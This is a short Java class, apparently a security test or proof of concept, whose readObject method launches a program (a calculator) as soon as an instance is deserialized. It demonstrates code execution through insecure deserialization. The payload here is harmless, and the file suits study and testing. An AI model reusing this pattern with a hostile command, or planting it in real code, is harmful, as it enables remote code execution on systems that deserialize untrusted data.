package spring;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Test implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("/usr/bin/gnome-calculator");
    }
}